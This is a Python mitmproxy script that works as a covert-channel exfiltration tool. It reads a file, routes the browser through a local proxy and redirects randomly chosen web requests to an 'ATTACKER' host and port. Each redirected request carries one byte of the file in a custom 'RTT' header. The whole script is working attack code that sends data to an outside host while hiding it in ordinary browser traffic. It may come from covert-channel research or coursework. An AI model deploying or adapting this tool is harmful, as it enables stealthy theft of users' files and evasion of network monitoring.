#! python
from mitmproxy.options import Options
from mitmproxy.tools.dump import DumpMaster
from mitmproxy import http
import proxybrowser as browser
from random import randint      

class AddInjection(object):
    """MiTMProxy addon that injects a message into the header of a response packet."""
    def __init__(self,p,m,ip,port):
        # covert message
        self.message = m
        self.ip = ip
        self.port = port
        # index
        self.index = 0
        self.proxy = p
        self.flag = 0

    def request(self,flow: http.HTTPFlow) -> None:
        i = randint(1,11)
        if self.flag:
            print("[*] Stopping Proxy...")
            self.proxy.shutdown()
            return
        if i%2 and (self.index <= len(self.message)):
            # intercept packet
            flow.intercept()

            # modify destination
            flow.request.host = self.ip
            flow.request.port = self.port
            
            try:
                flow.request.headers["RTT"] = str(self.message[self.index])
                print("[*] Injecting....")
                if self.index == len(self.message)-1:
                    while(flow.live):
                        print("[!] Waiting for EOF to be received.")
                        continue
            except IndexError:
                self.flag += 1
                flow.resume()
            
            self.index += 1
            flow.resume()

# configure proxy settings
def config_proxy()->DumpMaster:
    """Configures mitmproxy on specific port and address."""
    opts = Options(listen_host='127.0.0.1',listen_port=8081) 
    server = DumpMaster(opts)
    return server



def piggybackStorage(ip:str,port:int,fp:str)->None:
    ATTACKER = ip #comes from console
    ATTACKER_PORT = port

    input = []
    
    #get file
    with open(fp,'rb') as f:
        for line in f:
            for c in line:
                input.append(c)
    input.append(999)
    input.append(999)
    input.append(999)
    
    # configurations
    prox = config_proxy()
    prox.addons.add(AddInjection(prox,input,ATTACKER,ATTACKER_PORT))
    browser.set()
    # start proxying!

    print("[!] Starting Proxy")
    prox.run()
    print("[!] Proxy Stopped")
    browser.release()

if __name__ == "__main__":
    piggybackStorage('127.0.0.1',8081,'rainbow.png')
   